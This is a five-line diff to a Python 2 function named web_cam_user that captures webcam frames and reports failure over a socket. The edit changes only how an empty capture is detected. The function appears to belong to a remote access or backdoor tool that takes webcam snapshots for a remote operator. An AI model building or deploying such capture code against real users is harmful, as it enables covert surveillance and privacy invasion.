@@ -246,7 +246,7 @@ def web_cam_user():
         for i in xrange(ramp_frames):
             temp = get_image()
         camera_capture = get_image()
-        if not camera_capture:
+        if camera_capture == '':
             s.sendall('[-]Could not take webcam snapshot, webcam not configured properly' + End)
             return
         cv2.imwrite(tar_file, camera_capture)
